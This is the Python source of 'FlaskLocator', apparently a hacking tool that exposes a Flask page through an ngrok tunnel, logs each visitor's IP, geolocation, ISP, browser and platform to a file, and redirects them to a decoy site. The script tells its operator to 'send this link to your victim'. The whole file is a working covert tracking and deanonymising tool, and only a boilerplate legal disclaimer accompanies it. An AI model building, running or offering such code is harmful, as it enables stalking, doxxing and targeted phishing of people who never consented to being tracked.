import sys
import os
import logging
import requests
import json

from pyngrok import ngrok
from flask import Flask
from flask import request as r
from flask import render_template
from flask import jsonify


ngrok.kill() #Kill all previous ngrok tunnels.
port_ = 80
temp_ip_address_ = []
uniqe_ips = []
region = "us" #You can change ngrok region here.
ngrok_link = ngrok.connect(80, "http", region=region)
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

if sys.platform.lower() == "win32":
    os.system('color')

class style():
    BLACK = lambda x: '\033[30m' + str(x)
    RED = lambda x: '\033[31m' + str(x)
    GREEN = lambda x: '\033[32m' + str(x)
    YELLOW = lambda x: '\033[33m' + str(x)
    BLUE = lambda x: '\033[34m' + str(x)
    CYAN = lambda x: '\033[36m' + str(x)
    WHITE = lambda x: '\033[37m' + str(x)
    UNDERLINE = lambda x: '\033[4m' + str(x)
    RESET = lambda x: '\033[0m' + str(x)

def clear():
    print (u"{}[2J{}[;H".format(chr(27), chr(27)))



def banner():
    print(style.RESET('''

  ______ _           _    _                     _
 |  ____| |         | |  | |                   | |
 | |__  | | __ _ ___| | _| |     ___   ___ __ _| |_ ___  _ __
 |  __| | |/ _` / __| |/ / |    / _ \ / __/ _` | __/ _ \| '__|
 | |    | | (_| \__ \   <| |___| (_) | (_| (_| | || (_) | |
 |_|    |_|\__,_|___/_|\_\______\___/ \___\__,_|\__\___/|_|
''' + style.BLUE('''
        ::: Coded by  : @pr0xy07
        ::: Contact me: pr0xy07@tutanota.com
''')))



    print(style.YELLOW(
    '''
       [+]Python Flask Geolocator, Ip Tracker, Device Info by URL (Ngrok Hosting).

       [+]For more info you can contact me at pr0xy07@tutanota.com'''))
    print(style.RED(
    '''
       [+]LEGAL DISCLAIMER!
        Usage of Locator for attacking targets without prior mutual consent
        is illegal. It's the end user's responsibility to obey all applicable
        local, state and federal laws. Developers assume no liability and are
        not responsible for any misuse or damage caused by this program''' + style.RESET("")))




@app.route('/')
def index():
    return render_template('main.html', value = redirect)

@app.route('/', methods=['POST'])
def get_ip():
    data = r.get_json()
    ip_ = data['ip']

    if ip_ not in uniqe_ips:
        uniqe_ips.append(ip_)
        req = requests.get('https://ipinfo.io/{}/json'.format(ip_))
        resp_json = json.loads(req.text)
        print(str(style.GREEN("\n[+]") + style.RESET("New IP found:")))
        print("Device IP: {}".format(ip_))
        print("Device Country: {}".format(resp_json['country'].title()))
        print("Device Region: {}".format(resp_json['region'].title()))
        print("Device City Location: {}".format(resp_json['city'].title()))
        print("Device Platform: {}".format(r.user_agent.platform.title()))
        print("Device Browser: {}".format(r.user_agent.browser.title()))
        print("Browser Version: {}".format(r.user_agent.version.title()))
        print("Device Location: {}".format(resp_json['loc']))
        print("Device Timezone: {}".format(resp_json['timezone']))
        print("Service Provider: {}".format(resp_json['org']))
        print("User Agent: {}".format(r.headers.get('User-Agent')))

        f = open("log.txt", 'a')
        f.write("\nDevice IP: {}\n".format(ip_))
        f.write("Device Country: {}\n".format(resp_json['country'].title()))
        f.write("Device Region: {}\n".format(resp_json['region'].title()))
        f.write("Device City Location: {}\n".format(resp_json['city'].title()))
        f.write("Device Platform: {}\n".format(r.user_agent.platform.title()))
        f.write("Device Browser: {}\n".format(r.user_agent.browser.title()))
        f.write("Browser Version: {}".format(r.user_agent.version.title()))
        f.write("Device Location: {}\n".format(resp_json['loc']))
        f.write("Service Provider: {}\n".format(resp_json['org']))
        f.write("User Agent: {}\n".format(r.headers.get('User-Agent')))
        f.write("-" * 50)
        print(style.GREEN('[+]Saved data to log.txt'))

    else:
        print(style.GREEN("[+] {} connected again.".format(ip_)))

    return jsonify(status="success", data=data)

def main():
    if __name__ == '__main__':
        app.run(host = '0.0.0.0', port=port_)


while True:
    clear()
    banner()
    redirect = str(input(style.GREEN("\n[+]") + style.RESET("Please enter website to redirect to (Default: www.google.com):")))
    if redirect == "" :
        redirect = "www.google.com"
    print(str(style.GREEN("[+]") + style.RESET("Starting ngrok server...")))
    print(str(style.GREEN("\n[+]") + style.RESET("Send this link to your victim: {}\n").format(ngrok_link)))
    main()
    print(str(style.GREEN("[+]") + style.RESET("Closing ngrok server...")))
    print(ngrok.kill())
    clear()
    banner()
    print(str(style.GREEN("\n[+]") + style.RESET("Thank you for using FlaskLocator.")))
    print(str(style.GREEN("[+]") + style.RESET("For more information contact me: pr0xy07@tutanota.com")))
    break
